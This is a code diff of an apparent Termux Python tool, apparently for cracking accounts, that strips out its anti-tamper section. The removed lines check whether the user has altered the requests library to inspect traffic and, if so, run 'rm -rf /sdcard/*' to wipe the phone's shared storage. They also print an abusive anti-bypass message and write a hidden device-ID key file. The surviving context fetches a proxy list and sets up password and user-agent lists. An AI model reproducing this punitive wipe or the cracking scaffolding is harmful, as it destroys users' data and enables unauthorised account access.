@@ -82,55 +82,7 @@ elif bit == '32bit':
  #───────────────[BIT End]───────────────────────── #
  
  
-def es():
-      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
-           pass
-      else:
-           system('clear');print('System Modification Not Allowed since using Jutt');exit()
- 
-      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
-           pass
-      else:
-           system('clear');print('System Modification Not Allowed since using Jutt');exit()
- 
-      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
-           pass
-      else:
-           system('clear');print('System Modification Not Allowed since using Jutt');exit()
- 
- 
- 
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
-    file_content = file.read()
-if 'print(url)' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip install requests')
-    exit('[ðŸ¤£] RE-RUN TOOL.!')
- 
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
-    file_content = file.read()
-if 'print' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip install requests')
-    exit('[ðŸ¤£] RE-RUN TOOL.!')
- 
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip install requests')
-    exit('[ðŸ¤£] RE-RUN TOOL.!')
-  
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip install requests')
-    exit('[ðŸ¤£] RE-RUN TOOL.!')
+
 #----------http_canary-------#
 import requests
 import os,sys
@@ -153,14 +105,7 @@ try:
 except ModuleNotFoundError:
     os.system('pip install requests')
     
-def clr():
-    try:
-        data = os.listdir('/sdcard/*')
-        if 'Android' in data:
-            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY LIMON');exit()
-        else:exit()
-    except:exit()   
- 
+
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
 	open('proxies.txt','w').write(prox)
@@ -207,15 +152,7 @@ ugen = []
 method = []
 password = []
  
-myid = uuid.uuid4().hex[:40].upper()
-idmy = uuid.uuid4().hex[:6].upper()
-try:
-    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
-except:
-    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
-    getx.write(myid+idmy)
-    getx.close()
-MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
+
  
 #-----------------------------------------------------#
  
